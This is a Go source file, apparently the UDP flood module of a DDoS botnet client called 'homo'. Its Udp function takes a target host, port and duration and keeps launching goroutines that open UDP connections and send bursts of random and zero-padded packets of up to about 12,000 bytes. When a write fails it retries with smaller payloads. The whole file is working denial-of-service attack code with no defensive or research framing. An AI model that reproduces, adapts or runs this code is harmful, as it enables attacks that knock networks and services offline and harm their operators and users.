package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"net"
	"strconv"
	"strings"
	"time"
)

func Udp(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go udpcon(target, port)
		time.Sleep(200 * time.Millisecond)
		go udpcon(target, port)
	}

}

func udpcon(target string, port string) {
UDP:
	con, err := net.Dial("udp", target+":"+port)

	if err != nil {
		goto UDP
	}

	for i := 0; i < 30; i++ {
		select {
		case <-balancer.BalanceCh:
			fmt.Println("Balancer")
			time.Sleep(5 * time.Second)
		default:
			go rnd(con)
			go nilpayload(con, 12000)
			go maxpayload(con, 6000)
			go rnd(con)
			go nilpayload(con, 12000)
			go maxpayload(con, 6000)
			time.Sleep(2 * time.Second)
		}
	}
}

func rnd(con net.Conn) {

	var bytestr = []byte{byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2))}

	var res string
	for _, i := range bytestr {
		res += string(i >> 4 * 2)
	}

	fmt.Println([]byte(res))

	con.SetWriteDeadline(time.Now().Add(time.Second))

	_, err := con.Write([]byte(res))
	if err != nil {
		fmt.Println(err)
	}

}

func nilpayload(con net.Conn, len int) {

	payload := make([]byte, len)

	payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))

	con.SetWriteDeadline(time.Now().Add(time.Second))

	fmt.Println(len)
	_, err := con.Write(payload)
	if err != nil {
		fmt.Println(err)
		if len-1000 > 0 {
			nilpayload(con, len-1000)
		}
	}

}

func maxpayload(con net.Conn, size int) {

	payload := make([]byte, 0)

	for i := 0; i <= size; i++ {
		payload = append(payload, byte(utils.RandomInt(2)))
	}

	_, err := con.Write(payload)
	if err != nil {
		fmt.Println(err)
		if size-1000 > 0 {
			maxpayload(con, size-1000)
		}
	}

}
